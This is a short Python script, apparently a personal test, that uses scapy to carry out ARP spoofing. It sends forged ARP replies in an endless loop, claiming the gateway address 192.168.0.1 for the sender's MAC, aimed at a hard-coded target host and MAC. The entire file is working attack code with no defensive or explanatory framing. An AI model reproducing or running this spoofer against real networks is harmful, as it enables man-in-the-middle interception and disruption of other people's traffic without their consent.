from scapy.all import *
#test success
try:
    print("ARP Spoofer starting , press ctrl+c to stop")
    def send_arp_pkt(my_mac , target_mac , gateway_ip , target_ip):
            #creation of packet layers
            p1  =  Ether()
            p1.src  = my_mac
            p1.dst = target_mac


            p2 = ARP()
            p2.psrc =  gateway_ip
            p2.hwsrc =  my_mac
            p2.pdst =  target_ip
            p2.hwdst =  target_mac
            p2.op = 2 #operation code is 2

            #sending pkt
            pkt = p1/p2
            while 1:
                sendp(pkt , verbose = False)
    send_arp_pkt( "00:E0:4A:0A:8E:65","9c:28:f7:d0:4a:18" ,"192.168.0.1" ,"192.168.0.149")

except KeyboardInterrupt:
    pass